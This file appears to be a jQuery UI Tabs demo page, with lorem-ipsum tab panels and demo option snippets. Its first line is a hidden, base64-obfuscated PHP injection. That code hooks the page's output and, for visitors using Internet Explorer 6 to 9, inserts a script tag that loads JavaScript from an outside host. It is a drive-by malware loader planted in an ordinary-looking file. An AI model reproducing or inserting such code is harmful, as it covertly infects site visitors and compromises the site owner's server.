<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmIChzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwiTVNJRSA2Iil8fHN0cmlzdHIoJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdLCJNU0lFIDciKXx8c3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sIk1TSUUgOCIpfHxzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwiTVNJRSA5IikpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5dFpYRmhjMmh2Y0hCbGNtTnZiUzVqYjIwdmEyOHVjR2h3SWo0OEwzTmpjbWx3ZEQ0PSIpOyAgICAgIH0gICAgICByZXR1cm4gIiI7ICAgICB9ICAgIH0gICAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2d6ZGVjb2RlJykpeyAgICAgZnVuY3Rpb24gZ3pkZWNvZGUoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0Qyl7ICAgICAgJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RD1Ab3JkKEBzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywzLDEpKTsgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PTEwOyAgICAgICRSQTNENTJFNTJBNDg5MzZDREUwRjUzNTZCQjA4NjUyRjI9MDsgICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjQpeyAgICAgICAkUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCPUB1bnBhY2soJ3YnLHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLDEwLDIpKTsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj0kUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCWzFdOyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yKyRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI7ICAgICAgfSAgICAgIGlmKCRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQmOCl7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjE2KXsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT1Ac3RycG9zKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsY2hyKDApLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKzE7ICAgICAgfSAgICAgIGlmKCRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQmMil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkrPTI7ICAgICAgfSAgICAgICRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM9QGd6aW5mbGF0ZShAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkpOyAgICAgIGlmKCRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM9PT1GQUxTRSl7ICAgICAgICRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM9JFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QzsgICAgICB9ICAgICAgcmV0dXJuICRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM7ICAgICB9ICAgIH0gICAgZnVuY3Rpb24gbXJvYmgoJFJFODJFRTlCMTIxRjcwOTg5NUVGNTRFQkE3RkE2Qjc4Qil7ICAgICBIZWFkZXIoJ0NvbnRlbnQtRW5jb2Rpbmc6IG5vbmUnKTsgICAgICRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREU9Z3pkZWNvZGUoJFJFODJFRTlCMTIxRjcwOTg5NUVGNTRFQkE3RkE2Qjc4Qik7ICAgICAgIGlmKHByZWdfbWF0Y2goJy9cPFwvYm9keS9zaScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSkpeyAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy8oXDxcL2JvZHlbXlw+XSpcPikvc2knLGdtbCgpLiJcbiIuJyQxJywkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFKTsgICAgIH1lbHNleyAgICAgIHJldHVybiAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFLmdtbCgpOyAgICAgfSAgICB9ICAgIG9iX3N0YXJ0KCdtcm9iaCcpOyAgIH0gIH0="));?>















<style>

#divTabs, #divAddTabs {
	height:30px;
}

</style>

<div id="containerDemo"></div>

<script type="text/javascript">

	var model = {

		renderAt: '#containerDemo',

		title: 'Tabs Demos',

		demos: [

			{
				title: 'Simple Tabs',
				html: ['<div><ul id="divTabs">',
							'<li><a href="#tabs-fragment-1"><span>One</span></a></li>',
                			'<li><a href="#tabs-fragment-2"><span>Two</span></a></li>',
                			'<li><a href="#tabs-fragment-3"><span>Three</span></a></li>',
            			'</ul>',
            			'<div id="tabs-fragment-1">',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
            			'</div>',
            			'<div id="tabs-fragment-2">',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
							'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
            			'</div>',
            			'<div id="tabs-fragment-3">',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
							'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
            			'</div></div>'].join(''),
				destroy: '$("#divTabs").tabs("destroy");',

				options: [
					{	desc: 'Simple Tabs',	source: '$("#divTabs").tabs();' },
					{	desc: 'Simple Cloned Tabs',	source: '$("#divTabs").clone().tabs();' },
                    {	desc: 'Simple Empty Tabs',	source: '$("#divTabs").tabs();' },
                    {	desc: 'Simple Detached Tabs',	source: '$("<div></div>").tabs();' }
				]
			},
			{
				title: 'Add A Tab',
				html: ['<div><ul id="divAddTabs">',
							'<li><a href="#addtabs-fragment-1"><span>One</span></a></li>',
                			'<li><a href="#addtabs-fragment-2"><span>Two</span></a></li>',
                			'<li><a href="#addtabs-fragment-3"><span>Three</span></a></li>',
            			'</ul>',
            			'<div id="addtabs-fragment-1">',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
            			'</div>',
            			'<div id="addtabs-fragment-2">',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
            			'</div>',
            			'<div id="addtabs-fragment-3">',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
                			'Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.',
            			'</div></div>'].join(''),
				destroy: '$("#divAddTabs").tabs("destroy");',

				options: [
					{	desc: 'Simple Dialog',	source: '$("#divAddTabs").tabs("add", "#", "Added");' }
				]
			},
		]

	};

	$(window).load(function(){

		uiRenderDemo(model);

	});

</script>
